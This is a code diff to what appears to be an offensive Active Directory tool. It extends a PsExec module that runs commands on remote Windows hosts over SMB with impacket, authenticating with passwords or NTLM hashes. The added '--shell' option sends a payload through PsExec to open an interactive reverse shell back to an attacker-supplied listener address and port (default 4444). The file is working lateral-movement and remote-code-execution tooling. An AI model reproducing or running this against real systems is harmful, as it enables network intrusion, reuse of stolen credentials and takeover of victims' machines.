@@ -1,4 +1,7 @@
-"""PsExec — remote command execution via SMB service creation."""
+"""PsExec -- remote command execution via SMB service creation.
+
+Supports --shell for interactive PTY session after execution.
+"""
 
 from __future__ import annotations
 
@@ -24,7 +27,10 @@ def run(args: Any) -> int:
         print("[!] PsExec requires credentials", file=sys.stderr)
         return 1
 
-    print(f"[*] PsExec → {args.target} ({args.domain}\\{cred.username})")
+    shell_mode = getattr(args, "shell", False)
+    print("[*] PsExec → {} ({}\\{}){}".format(
+        args.target, args.domain, cred.username,
+        " [interactive shell]" if shell_mode else ""))
 
     try:
         from impacket.examples.psexec import PSEXEC
@@ -32,15 +38,42 @@ def run(args: Any) -> int:
         print("[!] impacket not installed", file=sys.stderr)
         return 1
 
+    if shell_mode:
+        lhost = getattr(args, "lhost", None)
+        lport = int(getattr(args, "lport", 4444))
+        shell_type = getattr(args, "shell_type", "powershell")
+
+        if not lhost:
+            print("[!] --shell requires --lhost", file=sys.stderr)
+            return 1
+
+        from adxpl.core.shell_mixin import spawn_ad_shell
+
+        def _exec_payload(payload: str) -> None:
+            executer = PSEXEC(
+                payload, None, None,
+                username=cred.username, password=cred.password or "",
+                domain=args.domain,
+                hashes=cred.impacket_hash if cred.has_hash else None,
+            )
+            executer.run(args.target)
+
+        ok = spawn_ad_shell(
+            target=args.target, lhost=lhost, lport=lport,
+            shell_type=shell_type, execute_fn=_exec_payload,
+        )
+        return 0 if ok else 1
+
     try:
         executer = PSEXEC(
             "whoami", None, None,
             username=cred.username, password=cred.password or "",
-            domain=args.domain, hashes=cred.impacket_hash if cred.has_hash else None,
+            domain=args.domain,
+            hashes=cred.impacket_hash if cred.has_hash else None,
         )
         executer.run(args.target)
         print("[+] PsExec command executed")
         return 0
     except Exception as exc:
-        print(f"[-] PsExec failed: {exc}", file=sys.stderr)
+        print("[-] PsExec failed: {}".format(exc), file=sys.stderr)
         return 1
